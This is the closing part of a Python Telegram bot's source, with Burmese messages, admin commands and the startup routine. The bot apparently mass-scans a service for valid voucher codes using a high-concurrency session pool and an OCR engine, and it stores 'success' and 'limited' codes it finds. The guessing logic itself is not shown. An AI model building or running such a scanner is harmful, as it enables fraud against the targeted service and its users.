async def cmd_stop(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    cid = message.chat.id
    data = scan_tasks.get(cid)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(cid, None)
        save_state()
        await bot.reply_to(message, "⏹️ ရပ်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "⚠️ ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=["saved"])
async def cmd_saved(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    cid = message.chat.id
    success = success_texts.get(cid, [])
    limited = limited_texts.get(cid, [])
    if not success and not limited:
        await bot.reply_to(message, "⚠️ ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        parts.extend(f"`{it['code']}` – ⏳ {it.get('plan','N/A')}" for it in success)
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(f"`{c}`" for c in limited)
    await send_chunks(cid, "\n".join(parts), parse_mode="Markdown", reply_to_message_id=message.message_id)

@bot.message_handler(commands=["delete_saved"])
async def cmd_delete_saved(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    cid = message.chat.id
    s_count = len(success_texts.get(cid, []))
    l_count = len(limited_texts.get(cid, []))

    success_texts.pop(cid, None)
    limited_texts.pop(cid, None)
    save_state()
    await bot.reply_to(message, f"🗑️ ဖျက်ပြီးပါပြီ။ Success: {s_count}, Limited: {l_count}")

@bot.message_handler(commands=["notify"])
async def cmd_notify(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    cid = message.chat.id
    notify_setting[cid] = not notify_setting.get(cid, False)
    save_state()
    await bot.reply_to(message, f"📢 Notify: {'ON ✅' if notify_setting[cid] else 'OFF ❌'}")

@bot.message_handler(commands=["status"])
async def cmd_status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up = int(time.monotonic() - START_TS)
    h, r = divmod(up, 3600)
    m, s = divmod(r, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status ({CPU_CORES} Cores / {VPS_RAM}GB RAM)\n"
        f"⏱ Uptime: {h}h {m}m {s}s\n"
        f"🔍 Active scans: {active}\n"
        f"🔋 Pre-auth Pool Size: {session_pool.qsize()}\n"
        f"💎 Codes cached: {sum(len(v) for v in success_texts.values())}"
    )

# ── Polling / main ─────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            logger.warning("Polling error: %s — retry in %ds", e, backoff)
        await asyncio.sleep(backoff)

async def main():
    global session, _connector, _voucher_sem

    _connector = aiohttp.TCPConnector(limit=600, ttl_dns_cache=300, force_close=True)
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), connector=_connector, connector_owner=False)
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    logger.info("⚙️ Pre-loading OCR Engine...")
    _get_ocr()

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        asyncio.create_task(web_server())
        asyncio.create_task(github_writer_loop())
        load_state()
        
        for cid, data in user_data.items():
            if "session_url" in data:
                pool_tasks[cid] = asyncio.create_task(session_pool_filler(data["session_url"]))
                
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == "__main__":
    asyncio.run(main())
